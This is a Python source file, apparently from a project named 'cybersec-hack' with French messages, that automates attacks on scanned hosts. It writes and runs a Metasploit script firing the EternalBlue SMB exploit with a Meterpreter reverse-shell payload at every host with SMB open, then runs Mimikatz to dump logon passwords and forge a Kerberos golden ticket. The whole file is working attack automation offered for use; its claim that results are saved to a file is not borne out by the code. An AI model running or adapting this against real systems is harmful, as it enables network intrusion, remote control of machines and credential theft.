# cybersec-hack/exploitation.py

import subprocess
import os

def run_metasploit_exploit(scan_results):
    print("[+] Début de l'exploitation automatisée via Metasploit...")

    metasploit_script = "msf_script.rc"
    with open(metasploit_script, "w") as f:
        f.write("load auto_add_route\n")
        for host in scan_results:
            ip = host['ip']
            for port in host['ports']:
                if port['service'] == 'smb':
                    f.write(f"use exploit/windows/smb/ms17_010_eternalblue\n")
                    f.write(f"set RHOSTS {ip}\n")
                    f.write("set RPORT 445\n")
                    f.write("set PAYLOAD windows/x64/meterpreter/reverse_tcp\n")
                    f.write("set LHOST 127.0.0.1\n")  # À adapter selon ton réseau
                    f.write("set LPORT 4444\n")
                    f.write("exploit -j\n")
        f.write("exit\n")

    try:
        subprocess.run(["msfconsole", "-r", metasploit_script], check=True)
        print("[✓] Exploitation lancée avec succès.")
    except subprocess.CalledProcessError as e:
        print("[!] Erreur lors de l'exécution de Metasploit :", e)

def run_mimikatz():
    print("[+] Exécution de Mimikatz pour post-exploitation...")

    mimikatz_exe = "tools/mimikatz/mimikatz.exe"
    if not os.path.exists(mimikatz_exe):
        print("[!] Mimikatz non trouvé. Assurez-vous qu'il est téléchargé via setup.py.")
        return None

    command = (
        "privilege::debug\n"
        "sekurlsa::logonpasswords\n"
        "kerberos::golden /user:admin /domain:dom.local "
        "/sid:S-1-5-21-0000000000-0000000000-0000000000 "
        "/krbtgt:HASH /id:500\n"
        "exit\n"
    )

    try:
        subprocess.run(["wine", mimikatz_exe], input=command.encode(), check=True)
        print("[✓] Mimikatz exécuté. Résultats enregistrés dans mimikatz_output.txt")
        return "mimikatz_output.txt"
    except subprocess.CalledProcessError as e:
        print("[!] Échec de l'exécution de Mimikatz :", e)
        return None
